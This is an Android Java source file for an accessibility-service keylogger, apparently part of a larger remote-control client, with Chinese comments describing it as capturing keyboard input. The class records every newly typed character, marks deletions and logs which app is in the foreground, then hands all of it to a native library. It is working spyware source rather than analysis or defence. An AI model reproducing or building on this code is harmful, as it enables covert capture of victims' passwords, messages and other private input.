package com.client;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

/**
 * 无障碍服务：监听文本输入事件，捕获键盘输入内容
 * 用户需在"设置 > 无障碍"中手动开启此服务
 */
public class KeylogAccessibilityService extends AccessibilityService {

    static { System.loadLibrary("client"); }

    public native void nativeOnKeyEvent(String text);

    private String mLastText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int type = event.getEventType();

        // 监听文本变化事件
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence text = event.getText().isEmpty() ? null : event.getText().get(0);
            if (text != null) {
                String current = text.toString();
                // 计算新增的字符
                String diff = getDiff(mLastText, current);
                if (!diff.isEmpty()) {
                    nativeOnKeyEvent(diff);
                }
                mLastText = current;
            }
        }

        // 监听窗口焦点变化（记录当前应用包名）
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg != null) {
                nativeOnKeyEvent("[APP:" + pkg + "]");
            }
            mLastText = "";
        }
    }

    private String getDiff(String oldText, String newText) {
        if (newText.length() > oldText.length()) {
            return newText.substring(oldText.length());
        } else if (newText.length() < oldText.length()) {
            return "[DEL]";
        }
        return "";
    }

    @Override
    public void onInterrupt() {}
}
